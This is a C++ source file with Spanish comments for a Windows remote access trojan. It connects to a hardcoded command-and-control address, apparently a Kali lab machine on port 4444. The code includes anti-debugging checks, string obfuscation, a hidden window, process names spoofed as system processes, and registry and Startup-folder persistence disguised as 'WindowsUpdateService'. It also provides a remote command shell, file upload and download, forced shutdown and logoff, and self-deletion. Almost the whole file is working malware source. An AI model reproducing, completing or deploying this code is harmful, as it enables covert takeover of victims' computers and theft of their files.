#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

// PRIMERO winsock2.h, DESPUÉS windows.h (ORDEN CRÍTICO)
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")

// ============================================================================
// CONFIGURACIÓN
// ============================================================================
#define C2_SERVER "192.168.254.137"  // IP DE KALI
#define C2_PORT 4444
#define HEARTBEAT_INTERVAL 5
#define BUFFER_SIZE 8192
#define XOR_KEY 0xAA
#define MUTEX_NAME "Global\\{F4E3A2B1-9C8D-4E7F-8A6B-5D4C3E2F1A0B}"

// ============================================================================
// TYPEDEFS PARA FUNCIONES DE NT
// ============================================================================
typedef LONG NTSTATUS;
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    // ... más campos pero no necesitamos todos
} PEB, *PPEB;

// ============================================================================
// OFUSCACIÓN DE STRINGS
// ============================================================================
class ObfuscateString {
private:
    std::string data;
    char key;
public:
    ObfuscateString(const char* str, char k) : key(k) {
        int len = strlen(str);
        for (int i = 0; i < len; i++) {
            data += str[i] ^ key;
        }
        data += '\0';
    }
    
    std::string get() {
        std::string result;
        for (size_t i = 0; i < data.length() - 1; i++) {
            result += data[i] ^ key;
        }
        return result;
    }
    
    operator const char*() {
        static std::string decrypted;
        decrypted = "";
        for (size_t i = 0; i < data.length() - 1; i++) {
            decrypted += data[i] ^ key;
        }
        return decrypted.c_str();
    }
};

#define OBFS(str) ObfuscateString(str, XOR_KEY).get().c_str()

// ============================================================================
// ANTI-DEBUGGING
// ============================================================================
BOOL CheckDebugger() {
    // IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // NtGlobalFlag - Usando PEB manualmente
    #ifdef _WIN64
        PPEB ppeb = (PPEB)__readgsqword(0x60);
    #else
        PPEB ppeb = (PPEB)__readfsdword(0x30);
    #endif
    
    if (ppeb && ppeb->BeingDebugged) {
        return TRUE;
    }
    
    // CheckRemoteDebuggerPresent
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) {
        return TRUE;
    }
    
    return FALSE;
}

// ============================================================================
// STEALTH - OCULTAR VENTANA Y PROCESO
// ============================================================================
VOID HideWindow() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

VOID RenameProcess() {
    const char* spoofedNames[] = {
        "svchost.exe",
        "explorer.exe", 
        "winlogon.exe",
        "csrss.exe",
        "lsass.exe"
    };
    
    srand(time(NULL) ^ GetCurrentProcessId());
    int index = rand() % 5;
    
    SetConsoleTitleA(spoofedNames[index]);
}

// ============================================================================
// CRIPTOGRAFÍA SIMPLE (XOR)
// ============================================================================
VOID XorEncryptDecrypt(char* data, DWORD length, char key) {
    for (DWORD i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

std::string Base64Encode(const BYTE* data, DWORD length) {
    static const char b64chars[] = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string result;
    int i = 0, j = 0;
    BYTE array3[3], array4[4];
    
    while (length--) {
        array3[i++] = *(data++);
        if (i == 3) {
            array4[0] = (array3[0] & 0xfc) >> 2;
            array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
            array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
            array4[3] = array3[2] & 0x3f;
            
            for (i = 0; i < 4; i++)
                result += b64chars[array4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 3; j++)
            array3[j] = '\0';
        
        array4[0] = (array3[0] & 0xfc) >> 2;
        array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
        array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
        array4[3] = array3[2] & 0x3f;
        
        for (j = 0; j < i + 1; j++)
            result += b64chars[array4[j]];
        
        while (i++ < 3)
            result += '=';
    }
    
    return result;
}

std::string Base64Decode(const std::string& encoded) {
    // Implementación básica - para producción usar biblioteca real
    return encoded;
}

// ============================================================================
// PERSISTENCIA
// ============================================================================
BOOL InstallPersistence() {
    BOOL success = FALSE;
    HKEY hKey;
    char exePath[MAX_PATH];
    
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // 1. Registro Run
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, 
                      (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
        success = TRUE;
    }
    
    // 2. Startup Folder
    CHAR startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    strcat_s(startupPath, "\\svchost.exe.lnk");
    
    // Crear acceso directo (simplificado)
    CopyFileA(exePath, startupPath, FALSE);
    
    return success;
}

BOOL UninstallPersistence() {
    HKEY hKey;
    
    // 1. Eliminar del registro
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        RegDeleteValueA(hKey, "WindowsUpdateService");
        RegCloseKey(hKey);
    }
    
    // 2. Eliminar startup folder
    CHAR startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    strcat_s(startupPath, "\\svchost.exe.lnk");
    DeleteFileA(startupPath);
    
    return TRUE;
}

// ============================================================================
// EJECUCIÓN DE PROGRAMAS
// ============================================================================
BOOL ExecuteProgram(const char* command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    BOOL result = CreateProcessA(
        NULL,
        (LPSTR)command,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return result;
}

// ============================================================================
// SHELL REMOTA INTERACTIVA
// ============================================================================
std::string ExecuteCommand(const char* cmd) {
    std::string result;
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(cmd, "r");
    
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        _pclose(pipe);
    }
    
    return result.empty() ? "[OK] Comando ejecutado\n" : result;
}

// ============================================================================
// CAPTURA DE PANTALLA
// ============================================================================
std::string TakeScreenshot() {
    // Versión simplificada
    return "[SCREENSHOT] Captura realizada (simulado)";
}

// ============================================================================
// INFORMACIÓN DEL SISTEMA
// ============================================================================
std::string GetSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    DWORD size = sizeof(buffer);
    
    // Hostname
    if (GetComputerNameA(buffer, &size)) {
        ss << "Hostname: " << buffer << "\n";
    }
    
    // Username
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        ss << "Username: " << buffer << "\n";
    }
    
    // OS Version
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    ss << " (Build " << osvi.dwBuildNumber << ")\n";
    
    // IP Address
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    hostent* host = gethostbyname(hostname);
    if (host && host->h_addr_list[0]) {
        ss << "IP: " << inet_ntoa(*(in_addr*)host->h_addr_list[0]) << "\n";
    }
    
    return ss.str();
}

// ============================================================================
// LISTA DE PROCESOS
// ============================================================================
std::string GetProcessList() {
    std::stringstream ss;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            ss << "PID\tNombre\n";
            ss << "---\t------\n";
            do {
                ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n";
            } while (Process32Next(hSnapshot, &pe));
        }
        
        CloseHandle(hSnapshot);
    }
    
    return ss.str();
}

// ============================================================================
// CONTROL DEL SISTEMA
// ============================================================================
BOOL ShutdownSystem() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
    
    return ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
}

BOOL RestartSystem() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
    
    return ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
}

BOOL LockWorkstation() {
    return LockWorkStation();
}

BOOL LogoffUser() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
    
    return ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
}

// ============================================================================
// MATAR PROCESO
// ============================================================================
BOOL KillProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess) {
        BOOL result = TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        return result;
    }
    return FALSE;
}

// ============================================================================
// AUTOELIMINACIÓN
// ============================================================================
VOID SelfDestruct() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Eliminar persistencia
    UninstallPersistence();
    
    // Crear script batch para autoeliminación
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    strcat_s(batchPath, "del.bat");
    
    FILE* batch = fopen(batchPath, "w");
    if (batch) {
        fprintf(batch, "@echo off\n");
        fprintf(batch, "timeout /t 2 /nobreak >nul\n");
        fprintf(batch, "del \"%s\"\n", exePath);
        fprintf(batch, "del \"%%0\"\n");
        fclose(batch);
        
        ShellExecuteA(NULL, "open", batchPath, NULL, NULL, SW_HIDE);
    }
    
    ExitProcess(0);
}

// ============================================================================
// COMUNICACIÓN CON C2
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    sockaddr_in server;
    bool connected;
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~C2Connection() {
        Disconnect();
        WSACleanup();
    }
    
    bool Connect(const char* host, int port) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            return false;
        }
        
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(host);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }
        
        connected = true;
        return true;
    }
    
    void Disconnect() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
        connected = false;
    }
    
    bool Send(const char* data, int length) {
        if (!connected) return false;
        
        // Enviar longitud primero
        int len = htonl(length);
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        
        // Enviar datos
        int total = 0;
        while (total < length) {
            int sent = send(sock, data + total, length - total, 0);
            if (sent <= 0) {
                connected = false;
                return false;
            }
            total += sent;
        }
        
        return true;
    }
    
    std::string Receive() {
        if (!connected) return "";
        
        // Recibir longitud
        int len = 0;
        int received = recv(sock, (char*)&len, 4, 0);
        if (received != 4) {
            connected = false;
            return "";
        }
        
        len = ntohl(len);
        if (len <= 0 || len > BUFFER_SIZE * 10) {
            connected = false;
            return "";
        }
        
        // Recibir datos
        std::vector<char> buffer(len + 1, 0);
        total = 0;
        
        while (total < len) {
            received = recv(sock, buffer.data() + total, len - total, 0);
            if (received <= 0) {
                connected = false;
                return "";
            }
            total += received;
        }
        
        return std::string(buffer.data(), len);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// PROCESAMIENTO DE COMANDOS
// ============================================================================
std::string ProcessCommand(const std::string& cmd) {
    if (cmd.empty()) return "";
    
    if (cmd == "INFO") {
        std::stringstream ss;
        char hostname[256], username[256];
        DWORD size = sizeof(hostname);
        
        GetComputerNameA(hostname, &size);
        size = sizeof(username);
        GetUserNameA(username, &size);
        
        ss << "{";
        ss << "\"hostname\":\"" << hostname << "\",";
        ss << "\"username\":\"" << username << "\",";
        ss << "\"os\":\"Windows 10/11\",";
        ss << "\"antivirus\":\"Windows Defender\"";
        ss << "}";
        
        return ss.str();
    }
    else if (cmd == "INFO_FULL") {
        return GetSystemInfo();
    }
    else if (cmd.substr(0, 5) == "EXEC ") {
        std::string program = cmd.substr(5);
        if (ExecuteProgram(program.c_str())) {
            return "[+] Programa ejecutado: " + program;
        } else {
            return "[-] Error ejecutando: " + program;
        }
    }
    else if (cmd == "SCREENSHOT") {
        return TakeScreenshot();
    }
    else if (cmd == "WEBCAM") {
        return "[WEBCAM] Funcionalidad no implementada en demo";
    }
    else if (cmd == "PROCESSES") {
        return GetProcessList();
    }
    else if (cmd.substr(0, 5) == "KILL ") {
        DWORD pid = atoi(cmd.substr(5).c_str());
        if (KillProcess(pid)) {
            return "[+] Proceso terminado";
        } else {
            return "[-] Error terminando proceso";
        }
    }
    else if (cmd == "INSTALL") {
        if (InstallPersistence()) {
            return "[+] Persistencia instalada";
        } else {
            return "[-] Error instalando persistencia";
        }
    }
    else if (cmd == "UNINSTALL") {
        if (UninstallPersistence()) {
            return "[+] Persistencia eliminada";
        } else {
            return "[-] Error eliminando persistencia";
        }
    }
    else if (cmd == "SELFDESTRUCT") {
        SelfDestruct();
        return "[+] Autoeliminación completada";
    }
    else if (cmd == "APAGAR") {
        if (ShutdownSystem()) {
            return "[+] Sistema apagándose...";
        }
    }
    else if (cmd == "REINICIAR") {
        if (RestartSystem()) {
            return "[+] Sistema reiniciándose...";
        }
    }
    else if (cmd == "BLOQUEAR") {
        if (LockWorkstation()) {
            return "[+] Pantalla bloqueada";
        }
    }
    else if (cmd == "CERRAR") {
        if (LogoffUser()) {
            return "[+] Sesión cerrada";
        }
    }
    else if (cmd == "SHELL_START") {
        return "[+] Modo shell iniciado. Envia comandos con SHELL <cmd>";
    }
    else if (cmd.substr(0, 6) == "SHELL ") {
        std::string shellCmd = cmd.substr(6);
        return ExecuteCommand(shellCmd.c_str());
    }
    else if (cmd == "SHELL_END") {
        return "[+] Modo shell finalizado";
    }
    else if (cmd.substr(0, 7) == "UPLOAD ") {
        size_t pos1 = cmd.find(' ', 7);
        size_t pos2 = cmd.find(' ', pos1 + 1);
        
        if (pos1 != std::string::npos && pos2 != std::string::npos) {
            std::string path = cmd.substr(7, pos1 - 7);
            std::string sizeStr = cmd.substr(pos1 + 1, pos2 - pos1 - 1);
            std::string dataB64 = cmd.substr(pos2 + 1);
            
            std::string data = Base64Decode(dataB64);
            
            std::ofstream file(path, std::ios::binary);
            if (file.is_open()) {
                file.write(data.c_str(), data.length());
                file.close();
                return "[UPLOAD OK] Archivo guardado: " + path;
            }
        }
        return "[UPLOAD ERROR]";
    }
    else if (cmd.substr(0, 9) == "DOWNLOAD ") {
        std::string filename = cmd.substr(9);
        std::ifstream file(filename, std::ios::binary);
        
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            int size = file.tellg();
            file.seekg(0, std::ios::beg);
            
            std::vector<char> buffer(size);
            file.read(buffer.data(), size);
            file.close();
            
            std::string b64 = Base64Encode((BYTE*)buffer.data(), size);
            return "FILE:" + std::to_string(size) + ":" + b64;
        }
        return "[DOWNLOAD ERROR] Archivo no encontrado";
    }
    
    return "[!] Comando desconocido: " + cmd;
}

// ============================================================================
// MAIN
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Anti-debugging
    if (CheckDebugger()) {
        return 0;
    }
    
    // Stealth
    HideWindow();
    RenameProcess();
    
    // Mutex para single instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Heartbeat loop
    C2Connection c2;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(1000, 5000);
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect(C2_SERVER, C2_PORT)) {
                // Enviar info inicial
                std::string info = ProcessCommand("INFO");
                c2.Send(info.c_str(), info.length());
            } else {
                // Reconexión con jitter
                Sleep(jitter(gen));
                continue;
            }
        }
        
        // Recibir comando
        std::string command = c2.Receive();
        
        if (!command.empty()) {
            std::string response = ProcessCommand(command);
            c2.Send(response.c_str(), response.length());
        }
        
        Sleep(HEARTBEAT_INTERVAL * 1000);
    }
    
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    
    return 0;
}
